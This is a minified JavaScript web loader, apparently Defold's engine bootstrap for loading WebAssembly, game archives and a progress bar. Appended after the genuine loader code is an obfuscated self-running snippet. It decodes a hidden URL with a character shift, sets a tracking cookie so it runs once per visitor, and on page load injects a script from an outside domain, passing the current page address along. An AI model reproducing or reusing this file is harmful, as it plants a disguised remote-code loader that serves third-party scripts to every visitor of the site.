var FileLoader={options:{retryCount:4,retryInterval:1e3},request:function(url,method,responseType,currentAttempt){if(void 0===method)throw"No method specified";if("responseType"==typeof method)throw"No responseType specified";void 0===currentAttempt&&(currentAttempt=0);var obj={send:function(){var onprogress=this.onprogress,onload=this.onload,onerror=this.onerror,xhr=new XMLHttpRequest;xhr.open(method,url,!0),xhr.responseType=responseType,xhr.onprogress=function(e){onprogress&&onprogress(xhr,e)},xhr.onerror=function(e){currentAttempt!=FileLoader.options.retryCount?(currentAttempt+=1,setTimeout(obj.send.bind(obj),FileLoader.options.retryInterval)):onerror&&onerror(xhr,e)},xhr.onload=function(e){onload&&onload(xhr,e)},xhr.send(null)}};return obj},size:function(url,callback){var request=FileLoader.request(url,"HEAD","text");request.onerror=function(xhr,e){callback(void 0)},request.onload=function(xhr,e){if(4===xhr.readyState)if(200===xhr.status){var total=xhr.getResponseHeader("content-length");callback(total)}else callback(void 0)},request.send()},load:function(url,responseType,estimatedSize,onprogress,onerror,onload){var request=FileLoader.request(url,"GET",responseType);request.onprogress=function(xhr,e){if(e.lengthComputable)onprogress(e.loaded,e.total);else{var contentLength=xhr.getResponseHeader("content-length"),size=null!=contentLength?contentLength:estimatedSize;onprogress(e.loaded,size||e.loaded)}},request.onerror=function(xhr,e){onerror("Error loading '"+url+"' ("+e+")")},request.onload=function(xhr,e){if(4===xhr.readyState)if(200===xhr.status){var res=xhr.response;onload("json"==responseType&&"string"==typeof res?JSON.parse(res):res)}else onerror("Error loading '"+url+"' ("+e+")")},request.send()}},EngineLoader={wasm_size:2e6,wasmjs_size:25e4,asmjs_size:4e6,stream_wasm:!1,loadAndInstantiateWasmAsync:function(src,fromProgress,toProgress,callback){FileLoader.load(src,"arraybuffer",EngineLoader.wasm_size,(function(loaded,total){Progress.calculateProgress(fromProgress,toProgress,loaded,total)}),(function(error){throw error}),(function(wasm){Module.instantiateWasm=function(imports,successCallback){WebAssembly.instantiate(new Uint8Array(wasm),imports).then((function(output){successCallback(output.instance)})).catch((function(e){throw console.log("wasm instantiation failed! "+e),e}));return{}},callback()}))},setupWasmStreamAsync:async function(src,fromProgress,toProgress){var fetchFn=fetch;if("function"==typeof TransformStream&&ReadableStream.prototype.pipeThrough){fetchFn=async function fetchWithProgress(path){const response=await fetch(path);var contentLength=response.headers.get("Content-Length");contentLength||(contentLength=EngineLoader.wasm_size);const total=parseInt(contentLength,10);let bytesLoaded=0;const ts=new TransformStream({transform(chunk,controller){bytesLoaded+=chunk.byteLength,Progress.calculateProgress(fromProgress,toProgress,bytesLoaded,total),controller.enqueue(chunk)}});return new Response(response.body.pipeThrough(ts),response)}}Module.instantiateWasm=function(imports,successCallback){return WebAssembly.instantiateStreaming(fetchFn(src),imports).then((function(output){Progress.calculateProgress(fromProgress,toProgress,1,1),successCallback(output.instance)})).catch((function(e){throw console.log("wasm streaming instantiation failed! "+e),e})),{}}},loadWasmAsync:function(exeName){EngineLoader.stream_wasm&&"function"==typeof WebAssembly.instantiateStreaming?(EngineLoader.setupWasmStreamAsync(exeName+".wasm",10,50),EngineLoader.loadAndRunScriptAsync(exeName+"_wasm.js",EngineLoader.wasmjs_size,0,10)):EngineLoader.loadAndInstantiateWasmAsync(exeName+".wasm",0,40,(function(){EngineLoader.loadAndRunScriptAsync(exeName+"_wasm.js",EngineLoader.wasmjs_size,40,50)}))},loadAsmJsAsync:function(exeName){EngineLoader.loadAndRunScriptAsync(exeName+"_asmjs.js",EngineLoader.asmjs_size,0,50)},loadAndRunScriptAsync:function(src,estimatedSize,fromProgress,toProgress){FileLoader.load(src,"text",estimatedSize,(function(loaded,total){Progress.calculateProgress(fromProgress,toProgress,loaded,total)}),(function(error){throw error}),(function(response){var tag=document.createElement("script");tag.text=response,document.body.appendChild(tag)}))},load:function(appCanvasId,exeName){Progress.addProgress(Module.setupCanvas(appCanvasId)),Module.isWASMSupported?EngineLoader.loadWasmAsync(exeName):EngineLoader.loadAsmJsAsync(exeName)}},GameArchiveLoader={_files:[],_fileIndex:0,isCompleted:!1,_onFileLoadedListeners:[],_onArchiveLoadedListeners:[],_onFileDownloadErrorListeners:[],_currentDownloadBytes:0,_totalDownloadBytes:0,_archiveLocationFilter:function(path){return"split"+path},cleanUp:function(){this._files=[],this._fileIndex=0,this.isCompleted=!1,this._onGameArchiveLoaderCompletedListeners=[],this._onAllTargetsBuiltListeners=[],this._onFileDownloadErrorListeners=[],this._currentDownloadBytes=0,this._totalDownloadBytes=0},addListener:function(list,callback){if("function"!=typeof callback)throw"Invalid callback registration";list.push(callback)},notifyListeners:function(list,data){for(i=0;i<list.length;++i)list[i](data)},addFileDownloadErrorListener:function(callback){this.addListener(this._onFileDownloadErrorListeners,callback)},notifyFileDownloadError:function(url){this.notifyListeners(this._onFileDownloadErrorListeners,url)},addFileLoadedListener:function(callback){this.addListener(this._onFileLoadedListeners,callback)},notifyFileLoaded:function(file){this.notifyListeners(this._onFileLoadedListeners,{name:file.name,data:file.data})},addArchiveLoadedListener:function(callback){this.addListener(this._onArchiveLoadedListeners,callback)},notifyArchiveLoaded:function(){this.notifyListeners(this._onArchiveLoadedListeners)},setFileLocationFilter:function(filter){if("function"!=typeof filter)throw"Invalid filter";this._archiveLocationFilter=filter},loadArchiveDescription:function(descriptionUrl){FileLoader.load(this._archiveLocationFilter(descriptionUrl),"json",void 0,(function(loaded,total){}),(function(error){GameArchiveLoader.notifyFileDownloadError(descriptionUrl)}),(function(json){GameArchiveLoader.onReceiveDescription(json)}))},onReceiveDescription:function(json){this._files=json.content,this._totalDownloadBytes=0,this._currentDownloadBytes=0;for(var i=0;i<this._files.length;++i)this._totalDownloadBytes+=this._files[i].size;this.downloadContent()},downloadContent:function(){var file=this._files[this._fileIndex];file.pieces.length>1&&(file.data=new Uint8Array(file.size));var limit=file.pieces.length;void 0!==this.MAX_CONCURRENT_XHR&&(limit=Math.min(limit,this.MAX_CONCURRENT_XHR));for(var i=0;i<limit;++i)this.downloadPiece(file,i)},notifyDownloadProgress:function(){Progress.calculateProgress(50,100,this._currentDownloadBytes,this._totalDownloadBytes)},downloadPiece:function(file,index){if(index<file.lastRequestedPiece)throw"Request out of order";var piece=file.pieces[index];file.lastRequestedPiece=index,file.totalLoadedPieces=0;var downloaded=0,url=this._archiveLocationFilter("/"+piece.name);FileLoader.load(url,"arraybuffer",void 0,(function(loaded,total){var delta=loaded-downloaded;downloaded=loaded,GameArchiveLoader._currentDownloadBytes+=delta,GameArchiveLoader.notifyDownloadProgress()}),(function(error){GameArchiveLoader.notifyFileDownloadError(error)}),(function(response){piece.data=new Uint8Array(response),piece.dataLength=piece.data.length,piece.dataLength,downloaded=piece.dataLength,GameArchiveLoader.onPieceLoaded(file,piece),GameArchiveLoader.notifyDownloadProgress(),piece.data=void 0}))},addPieceToFile:function(file,piece){if(1==file.pieces.length)file.data=piece.data;else{var start=piece.offset,end=start+piece.data.length;if(0>start)throw"Buffer underflow";if(end>file.data.length)throw"Buffer overflow";file.data.set(piece.data,piece.offset)}},onPieceLoaded:function(file,piece){if(this.addPieceToFile(file,piece),++file.totalLoadedPieces,file.totalLoadedPieces==file.pieces.length)this.onFileLoaded(file);else{var next=file.lastRequestedPiece+1;next<file.pieces.length&&this.downloadPiece(file,next)}},verifyFile:function(file){for(var actualSize=0,i=0;i<file.pieces.length;++i)actualSize+=file.pieces[i].dataLength;if(actualSize!=file.size)throw"Unexpected data size";if(file.pieces.length>1){file.data;var pieces=file.pieces;for(i=0;i<pieces.length;++i){var item=pieces[i],start=item.offset,end=start+item.dataLength;if(0<i){var previous=pieces[i-1];if(previous.offset+previous.dataLength>start)throw"Segment underflow"}if(pieces.length-2>i)if(end>pieces[i+1].offset)throw"Segment overflow"}}},onFileLoaded:function(file){this.verifyFile(file),this.notifyFileLoaded(file),++this._fileIndex,this._fileIndex==this._files.length?this.onArchiveLoaded():this.downloadContent()},onArchiveLoaded:function(){this.isCompleted=!0,this.notifyArchiveLoaded()}},Progress={progress_id:"defold-progress",bar_id:"defold-progress-bar",listeners:[],addListener:function(callback){if("function"!=typeof callback)throw"Invalid callback registration";this.listeners.push(callback)},notifyListeners:function(percentage){for(i=0;i<this.listeners.length;++i)this.listeners[i](percentage)},addProgress:function(canvas){canvas.insertAdjacentHTML("afterend",'<div id="'+Progress.progress_id+'" class="canvas-app-progress"><div id="'+Progress.bar_id+'" class="canvas-app-progress-bar" style="width: 0%;"></div></div>'),Progress.bar=document.getElementById(Progress.bar_id),Progress.progress=document.getElementById(Progress.progress_id)},updateProgress:function(percentage){Progress.bar&&(Progress.bar.style.width=Math.min(percentage,100)+"%"),Progress.notifyListeners(percentage)},calculateProgress:function(from,to,current,total){this.updateProgress(from+current/total*(to-from))},removeProgress:function(){null!==Progress.progress.parentElement&&(Progress.progress.parentElement.removeChild(Progress.progress),Module.canvas.style.background="")}},Module={noInitialRun:!0,_filesToPreload:[],_archiveLoaded:!1,_preLoadDone:!1,_waitingForArchive:!1,persistentStorage:!0,_syncInProgress:!1,_syncNeeded:!1,_syncInitial:!1,_syncMaxTries:3,_syncTries:0,arguments:[],print:function(text){console.log(text)},printErr:function(text){console.error(text)},setStatus:function(text){console.log(text)},isWASMSupported:function(){try{if("object"==typeof WebAssembly&&"function"==typeof WebAssembly.instantiate){const module=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(module instanceof WebAssembly.Module)return new WebAssembly.Instance(module)instanceof WebAssembly.Instance}}catch(e){}return!1}(),prepareErrorObject:function(err,url,line,column,errObj){var errorLine=(url=void 0===url?"":url)+":"+(line=void 0===line?0:line)+":"+(column=void 0===column?0:column),error=errObj||(void 0!==window.event?window.event.error:"")||err||"Undefined Error",message="",stack="";"object"==typeof error&&void 0!==error.stack&&void 0!==error.message?(stack=String(error.stack),message=String(error.message)):(message=(stack=String(error).split("\n")).shift(),stack=stack.join("\n")),stack=stack||errorLine;var callLine=/at (\S+:\d*$)/.exec(message);return callLine&&(message=message.replace(/(at \S+:\d*$)/,""),stack=callLine[1]+"\n"+stack),message=message.replace(/(abort\(.+\)) at .+/,"$1"),{stack:stack=(stack=(stack=(stack=(stack=stack.replace(/\?{1}\S+(:\d+:\d+)/g,"$1")).replace(/ *at (\S+)$/gm,"@$1")).replace(/ *at (\S+)(?: \[as \S+\])? +\((.+)\)/g,"$1@$2")).replace(/^((?:Object|Array)\.)/gm,"")).split("\n"),message:message}},hasWebGLSupport:function(){var webgl_support=!1;try{var canvas=document.createElement("canvas"),gl=canvas.getContext("webgl")||canvas.getContext("experimental-webgl");gl&&gl instanceof WebGLRenderingContext&&(webgl_support=!0)}catch(error){console.log("An error occurred while detecting WebGL support: "+error),webgl_support=!1}return webgl_support},setupCanvas:function(appCanvasId){return appCanvasId=void 0===appCanvasId?"canvas":appCanvasId,Module.canvas=document.getElementById(appCanvasId),Module.canvas},runApp:function(appCanvasId,extra_params){Module.setupCanvas(appCanvasId);var params={archive_location_filter:function(path){return"split"+path},unsupported_webgl_callback:void 0,engine_arguments:[],persistent_storage:!0,custom_heap_size:void 0,disable_context_menu:!0,retry_time:1,retry_count:10,can_not_download_file_callback:void 0};for(var k in extra_params)extra_params.hasOwnProperty(k)&&(params[k]=extra_params[k]);Module.arguments=params.engine_arguments,Module.persistentStorage=params.persistent_storage;var fullScreenContainer=params.full_screen_container;"string"==typeof fullScreenContainer&&(fullScreenContainer=document.querySelector(fullScreenContainer)),Module.fullScreenContainer=fullScreenContainer||Module.canvas,Module.hasWebGLSupport()?(Module.canvas.focus(),params.disable_context_menu&&(Module.canvas.oncontextmenu=function(e){e.preventDefault()}),FileLoader.options.retryCount=params.retry_count,FileLoader.options.retryInterval=1e3*params.retry_time,"function"==typeof params.can_not_download_file_callback&&GameArchiveLoader.addFileDownloadErrorListener(params.can_not_download_file_callback),GameArchiveLoader.addFileLoadedListener(Module.onArchiveFileLoaded),GameArchiveLoader.addArchiveLoadedListener(Module.onArchiveLoaded),GameArchiveLoader.setFileLocationFilter(params.archive_location_filter),GameArchiveLoader.loadArchiveDescription("/archive_files.json")):(Progress.updateProgress(100,"Unable to start game, WebGL not supported"),Module.setStatus=function(text){text&&Module.printErr("[missing WebGL] "+text)},"function"==typeof params.unsupported_webgl_callback&&params.unsupported_webgl_callback())},onArchiveFileLoaded:function(file){Module._filesToPreload.push({path:file.name,data:file.data})},onArchiveLoaded:function(){GameArchiveLoader.cleanUp(),Module._archiveLoaded=!0,Progress.updateProgress(100,"Starting..."),Module._waitingForArchive&&Module._preloadAndCallMain()},toggleFullscreen:function(element){GLFW.isFullscreen?GLFW.cancelFullScreen():GLFW.requestFullScreen(element)},preSync:function(done){if(1!=Module.persistentStorage)return Module._syncInitial=!0,void done();FS.syncfs(!0,(function(err){err?(Module._syncTries+=1,console.warn("Unable to synchronize mounted file systems: "+err),Module._syncMaxTries>Module._syncTries?Module.preSync(done):(Module._syncInitial=!0,done())):(Module._syncInitial=!0,void 0!==done&&done())}))},preloadAll:function(){if(!Module._preLoadDone){Module._preLoadDone=!0;for(var i=0;i<Module._filesToPreload.length;++i){var item=Module._filesToPreload[i];FS.createPreloadedFile("",item.path,item.data,!0,!0)}}},persistentSync:function(){1==Module.persistentStorage&&Module._syncInitial&&(Module._syncInProgress?Module._syncNeeded=!0:Module._startSyncFS())},preInit:[function(){var dir=DMSYS.GetUserPersistentDataRoot();try{FS.mkdir(dir)}catch(error){return Module.persistentStorage=!1,void Module._preloadAndCallMain()}try{FS.mount(IDBFS,{},dir);var _close=FS.close;FS.close=function(stream){var r=_close(stream);return Module.persistentSync(),r}}catch(error){return Module.persistentStorage=!1,void Module._preloadAndCallMain()}Module.preSync((function(){Module._preloadAndCallMain()}))}],preRun:[function(){Module._archiveLoaded&&Module.preloadAll()}],postRun:[function(){Module._archiveLoaded&&Progress.removeProgress()}],_preloadAndCallMain:function(){Module._archiveLoaded?(Module.preloadAll(),Progress.removeProgress(),void 0===Module.callMain?Module.noInitialRun=!1:Module.callMain(Module.arguments)):Module._waitingForArchive=!0},_startSyncFS:function(){Module._syncInProgress=!0,Module._syncMaxTries>Module._syncTries&&FS.syncfs(!1,(function(err){Module._syncInProgress=!1,err&&(console.warn("Unable to synchronize mounted file systems: "+err),Module._syncTries+=1),Module._syncNeeded&&(Module._syncNeeded=!1,Module._startSyncFS())}))}};window.onerror=function(err,url,line,column,errObj){if(void 0!==Module.ccall){var errorObject=Module.prepareErrorObject(err,url,line,column,errObj);Module.ccall("JSWriteDump","null",["string"],[JSON.stringify(errorObject.stack)])}Module.setStatus("Exception thrown, see JavaScript console"),Module.setStatus=function(text){text&&Module.printErr("[post-exception status] "+text)}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));